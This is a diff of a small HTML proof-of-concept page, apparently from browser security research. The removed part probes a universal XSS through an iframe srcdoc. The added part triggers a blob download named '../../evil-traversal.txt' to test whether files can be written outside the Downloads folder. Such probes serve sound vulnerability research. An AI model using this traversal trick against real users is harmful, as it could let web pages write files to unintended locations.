@@ -1,19 +1,43 @@
 <html>
-<head><title>test</title></head>
+<head>
+<title>test</title>
+</head>
 <body>
-<p>uxss iframe srcdoc</p>
+
+<p>path traversal download test</p>
 <button onclick="go()">click here</button>
 <p id="h"></p>
+
 <script>
 function go(){
-  var f = document.createElement('iframe');
-  f.srcdoc = '<h1>srcdoc page</h1><script>alert("srcdoc domain=" + document.domain)<\/script>';
-  document.body.appendChild(f);
+  document.getElementById('h').innerText = 'downloading 1...';
+
+  // download 1 - normal, buat pembanding
+  var blob1 = new Blob(['this is normal file'], {type:'text/plain'});
+  var url1 = URL.createObjectURL(blob1);
+  var a1 = document.createElement('a');
+  a1.href = url1;
+  a1.download = 'normal.txt';
+  document.body.appendChild(a1);
+  a1.click();
+  a1.remove();
+
   setTimeout(function(){
-    document.getElementById('h').innerText = 'BYPASS! trying to navigate iframe to second domain';
-    f.src = 'https://www.google.com/';
+    document.getElementById('h').innerText = 'BYPASS! trying path traversal...';
+    document.title = 'BYPASS!';
+
+    // download 2 - nyoba keluar dari folder Downloads
+    var blob2 = new Blob(['path traversal test - if you see this file outside Downloads, it is a bug'], {type:'text/plain'});
+    var url2 = URL.createObjectURL(blob2);
+    var a2 = document.createElement('a');
+    a2.href = url2;
+    a2.download = '../../evil-traversal.txt';
+    document.body.appendChild(a2);
+    a2.click();
+    a2.remove();
   }, 500);
 }
 </script>
+
 </body>
 </html>
